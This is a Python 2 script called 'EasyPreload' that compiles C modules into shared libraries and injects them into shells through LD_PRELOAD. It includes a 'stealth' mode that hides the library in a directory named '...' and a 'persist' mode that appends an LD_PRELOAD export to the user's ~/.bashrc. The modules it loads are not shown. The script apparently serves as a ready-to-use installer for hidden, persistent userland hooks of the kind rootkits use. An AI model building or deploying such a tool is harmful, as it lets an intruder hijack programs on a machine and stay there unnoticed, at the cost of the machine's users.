#!/usr/bin/env python

################################################################################
#                                 EasyPreload                                  #
#                            LD_PRELOAD interceptor                            #
################################################################################

import sys
import os.path
import subprocess

# FLAGS
_32bit = False
_stealth = False
_persist = False
_module = ""

def usage():
	with open('help/usage.txt') as f:
		print f.read()
	f.close()

def print_help():
	with open('help/help.txt') as f:
		print f.read()
	f.close()

def print_modules():
	for module in os.listdir('modules/'):
		print '* ' + module[:-2]
	
def check_args():
	if "--help" in sys.argv or "-h" in sys.argv:
		print_help()
		sys.exit(1)
	if "--list" in sys.argv or "-l" in sys.argv:
		print_modules()
		sys.exit(1)
	if "-m" not in sys.argv:
		usage()
		sys.exit(1)
	if "-m" in sys.argv:
		global _module
		try:
			_module = sys.argv[sys.argv.index('-m') + 1]
		except:
			usage()
			sys.exit(1)
		if(os.path.isfile('modules/' + _module + '.c') == False):
			print "Fatal Error: Module does not exist."
			sys.exit(1)
	if "--stealth" in sys.argv or "-s" in sys.argv:
		global _stealth
		_stealth = True
		print "* stealth mode on"
	if "--persist" in sys.argv or "-p" in sys.argv:
		global _persist
		_persist = True
		print "* persistence mode on"
	if "--32bit" in sys.argv:
		global _32bit
		_32bit = True
		print "* compiling for 32bit"

def get_output_path():
	global _stealth		
	if _stealth:
		subprocess.call(['mkdir','...'])
		return  ".../"
	else:
		return os.getcwd() + '/'
	return ""

def get_c_to_o():
	global inputfile, outputfile, _32bit
	c_to_o = "gcc"
	if _32bit == True:
		c_to_o += " -m32"
	c_to_o += " -Wall -fPIC -c -o " + outputfile + ".o " + inputfile
	return c_to_o

def get_o_to_so():
	global inputfile, outputfile, _32bit
	o_to_so = "gcc"
	if _32bit == True:
		o_to_so += " -m32"
	o_to_so += " -shared -fPIC -Wl,-soname -Wl," + outputfile + ".so -o " + outputfile + ".so " + outputfile + ".o -ldl"
	return o_to_so

check_args()

inputfile = "modules/" + _module + ".c"
outputfile = get_output_path() + _module

print "* preloading " + inputfile
print "* saving into " + outputfile

print "* compiling module"
subprocess.call(get_c_to_o().split())

print "* converting to shared library"
subprocess.call(get_o_to_so().split())

print "* removing .o"
subprocess.call(['rm',outputfile + ".o"])

if _persist:
	print "* adding to ~/.bashrc"
	homefilename = os.path.expanduser('~') + '/.bashrc'
	with open(homefilename, "a") as homefile:
    		homefile.write("export LD_PRELOAD=$LD_PRELOAD:" + outputfile + ".so")
else:
	print "* spawning a child shell"
	current_preload = os.getenv('LD_PRELOAD')
	new_preload = outputfile + '.so'
	if current_preload != None:
		new_preload += ':' + current_preload
	os.putenv('LD_PRELOAD',new_preload)
	subprocess.call(['/bin/bash'])

